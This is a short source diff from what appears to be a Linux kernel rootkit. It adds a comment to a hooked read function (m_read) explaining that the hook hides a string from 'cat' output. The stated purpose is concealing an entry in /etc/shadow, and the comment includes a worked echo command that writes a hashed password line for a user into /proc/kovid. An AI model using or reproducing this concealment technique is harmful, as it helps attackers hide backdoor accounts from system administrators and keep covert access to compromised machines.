@@ -258,6 +258,14 @@ static void _md5log_cleanup_list(void) {
 /**
  * Will hide a string from files, if command
  * cat is used
+ *
+ * Use case here is for hiding an entry in /etc/shadow
+ * and that's it.
+ * Example:
+ *
+ * $ echo "-f example:\$y\$j9T\$ZAe6Sm4X7K5Trr0yvZFXO.\$hVPrdvJjQBthxljTJegIZlEfX/LRkXHo4rCVp1MaI.1:19097:0:99999:7:::" >/proc/kovid
+ *
+ * Notice the need to escape $ characters
  */
 static asmlinkage long m_read(struct pt_regs *regs) {
 
